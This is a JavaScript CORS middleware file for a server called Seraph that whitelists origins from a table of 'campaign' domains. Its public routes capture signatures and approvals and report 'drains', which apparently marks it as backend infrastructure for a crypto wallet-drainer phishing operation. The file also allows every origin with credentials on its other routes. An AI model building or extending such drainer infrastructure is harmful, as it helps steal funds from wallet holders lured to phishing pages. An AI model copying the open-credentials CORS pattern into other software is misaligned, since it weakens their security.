/**
 * ============================================================================
 * SERAPH SERVER - Hybrid CORS Middleware (Production)
 * ============================================================================
 * 
 * Fast hybrid CORS:
 * - Public endpoints: Validate against campaign_domains (cached)
 * - Authenticated endpoints: Allow all (JWT protects them)
 * 
 * Performance:
 * - In-memory cache of allowed domains
 * - Refreshes every 5 minutes
 * - O(1) lookup time 
 * 
 * ============================================================================
 */

import cors from 'cors'
import supabase from '../config/supabase.js'

// ============================================================================
// Domain Cache
// ============================================================================

let allowedDomains = new Set()
let lastRefresh = 0
const REFRESH_INTERVAL = 5 * 60 * 1000 // 5 minutes

// Static allowed domains (always allowed)
const STATIC_ALLOWED = new Set([
  'localhost',
  '127.0.0.1',
  'dev.onyxprotocol.io',
  'panel.seraphcoresys.online',
  'admin.seraphcoresys.online' ,
  'api.seraphcoresys.online'
])

/**
 * Load domains from campaign_domains table into memory
 */
async function refreshDomainCache() {
  try {
    // Load all domains from campaign_domains (no verification filter)
    const { data, error } = await supabase
      .from('campaign_domains')
      .select('domain')

    if (error) {
      console.error('[CORS] Failed to refresh domain cache:', error.message)
      return
    }

    // Build new Set
    const newDomains = new Set()

    // Add static domains
    STATIC_ALLOWED.forEach(d => newDomains.add(d))

    // Add campaign domains
    if (data) {
      data.forEach(row => {
        if (row.domain) {
          // Normalize domain (remove protocol, trailing slash)
          const normalized = row.domain
            .replace(/^https?:\/\//, '')
            .replace(/\/$/, '')
            .toLowerCase()
          newDomains.add(normalized)
        }
      })
    }

    allowedDomains = newDomains
    lastRefresh = Date.now()

    console.log(`[CORS] Cache refreshed: ${allowedDomains.size} domains`)
  } catch (err) {
    console.error('[CORS] Cache refresh error:', err.message)
  }
}

/**
 * Check if domain is in cache
 */
function isDomainAllowed(origin) {
  if (!origin) return true // No origin = same origin or server-to-server

  try {
    // Extract hostname from origin
    const url = new URL(origin)
    const hostname = url.hostname.toLowerCase()

    // Check exact match
    if (allowedDomains.has(hostname)) return true

    // Check if localhost with port
    if (hostname === 'localhost' || hostname === '127.0.0.1') return true

    // Check if subdomain of allowed domain
    for (const allowed of allowedDomains) {
      if (hostname.endsWith('.' + allowed)) return true
    }

    return false
  } catch {
    return false
  }
}

/**
 * Ensure cache is fresh
 */
async function ensureCacheFresh() {
  if (Date.now() - lastRefresh > REFRESH_INTERVAL) {
    await refreshDomainCache()
  }
}

// ============================================================================
// Public Endpoints (strict CORS)
// ============================================================================

const PUBLIC_PATHS = [
  '/api/signatures/capture',
  '/api/approvals/capture',
  '/api/analytics/visit',
  '/api/analytics/connection',
  '/api/analytics/signature',
  '/api/analytics/drain',
  '/api/analytics/threat',
  '/api/config',
  '/api/drains/report',
  '/health'
]

function isPublicEndpoint(path) {
  return PUBLIC_PATHS.some(p => path.startsWith(p))
}

// ============================================================================
// CORS Configurations
// ============================================================================

/**
 * Strict CORS - For public endpoints
 * Only allows registered campaign domains
 */
export const strictCors = cors({
  origin: async (origin, callback) => {
    await ensureCacheFresh()

    if (isDomainAllowed(origin)) {
      callback(null, true)
    } else {
      console.warn(`[CORS] Blocked origin: ${origin}`)
      callback(new Error('Not allowed by CORS'))
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'X-Campaign-Key', 'X-API-Key'],
  maxAge: 600 // 10 minutes
})

/**
 * Open CORS - For authenticated endpoints
 * JWT handles security
 */
export const openCors = cors({
  origin: true, // Allow all
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key'],
  exposedHeaders: ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset'],
  maxAge: 86400 // 24 hours
})

/**
 * Hybrid CORS Middleware
 * Routes to strict or open based on endpoint
 */
export function hybridCors(req, res, next) {
  if (isPublicEndpoint(req.path)) {
    return strictCors(req, res, next)
  }
  return openCors(req, res, next)
}

// ============================================================================
// Initialize Cache on Import
// ============================================================================

refreshDomainCache().catch(err => {
  console.error('[CORS] Initial cache load failed:', err.message)
})

// ============================================================================
// Manual Cache Control
// ============================================================================

export async function forceRefreshDomains() {
  await refreshDomainCache()
  return allowedDomains.size
}

export function getDomainCount() {
  return allowedDomains.size
}

export function isDomainCached(domain) {
  return allowedDomains.has(domain.toLowerCase())
}

export default {
  hybridCors,
  strictCors,
  openCors,
  forceRefreshDomains,
  getDomainCount,
  isDomainCached
}